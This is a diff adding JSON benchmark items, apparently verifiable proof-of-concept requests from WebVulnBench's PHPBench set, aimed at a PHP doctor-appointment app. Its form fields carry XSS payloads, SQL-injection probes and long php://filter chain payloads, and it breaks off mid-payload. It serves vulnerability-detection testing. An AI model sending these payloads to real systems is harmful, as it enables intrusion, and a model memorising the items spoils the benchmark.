@@ -1,0 +1,540 @@
+[
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {
+      "patientId": [
+        "123"
+      ]
+    },
+    "request_id": "requests.67dbd4edb4386",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_0ec1e8",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dbd4edb82ac",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_1c24f2",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "patientDOB": [
+        "1;window.top._arachni_js_namespace_taint_tracer.log_execution_flow_sink();//"
+      ],
+      "patientEmail": [
+        "<br />\n<b>Notice</b>:  Trying to access array offset on value of type null in <b>/var/www/html/patient/profile.php</b> on line <b>385</b><br />"
+      ],
+      "patientFirstName": [
+        "<br />\n<b>Notice</b>:  Trying to access array offset on value of type null in <b>/var/www/html/patient/profile.php</b> on line <b>295</b><br />"
+      ],
+      "patientGender": [
+        "female"
+      ],
+      "patientLastName": [
+        "<br />\n<b>Notice</b>:  Trying to access array offset on value of type null in <b>/var/www/html/patient/profile.php</b> on line <b>301</b><br />"
+      ],
+      "patientMaritialStatus": [
+        "widowed"
+      ],
+      "patientPhone": [
+        "<br />\n<b>Notice</b>:  Trying to access array offset on value of type null in <b>/var/www/html/patient/profile.php</b> on line <b>379</b><br />"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {
+      "patientId": [
+        "123"
+      ]
+    },
+    "request_id": "requests.67fe91ab2cd02",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_1fa85a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {
+      "patientId": [
+        "123"
+      ]
+    },
+    "request_id": "requests.67dbd4edb21df",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_23e9f4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "GET",
+    "path": "/getuser.php",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "\""
+      ]
+    },
+    "request_id": "requests.67dbd4edabc72",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_2ed842",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "sqli%27"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dbd4edbd056",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_4b561e",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "\""
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dbd4edba1f4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_62489c",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "GET",
+    "path": "/patient/getschedule.php",
+    "post_data": {},
+    "query_params": {
+      "q": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67dbd4edaaf49",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_669acc",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/doctor/doctorprofile.php",
+    "post_data": {
+      "doctorAddress": [
+        "\""
+      ],
+      "doctorEmail": [
+        "dsehgal@gmail.com"
+      ],
+      "doctorFirstName": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "doctorLastName": [
+        "Sehgal"
+      ],
+      "doctorPhone": [
+        "0173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682734f219c75",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_75fdad",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/doctor/doctorprofile.php",
+    "post_data": {
+      "doctorAddress": [
+        "Hi there!"
+      ],
+      "doctorEmail": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "doctorFirstName": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "doctorLastName": [
+        "Sehgal"
+      ],
+      "doctorPhone": [
+        "0173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682734f21add4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_81a065",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/doctor/doctorprofile.php",
+    "post_data": {
+      "doctorAddress": [
+        "Hi there!"
+      ],
+      "doctorEmail": [
+        "dsehgal@gmail.com"
+      ],
+      "doctorFirstName": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "doctorLastName": [
+        "Sehgal"
+      ],
+      "doctorPhone": [
+        "javascript:alert(987890)"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682734f21ce4f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_a7c750",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/doctor/doctorprofile.php",
+    "post_data": {
+      "doctorAddress": [
+        "Hi there!"
+      ],
+      "doctorEmail": [
+        "dsehgal@gmail.com"
+      ],
+      "doctorFirstName": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "doctorLastName": [
+        "Sehgal"
+      ],
+      "doctorPhone": [
+        "0173567758"
+      ],
+      "submit": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.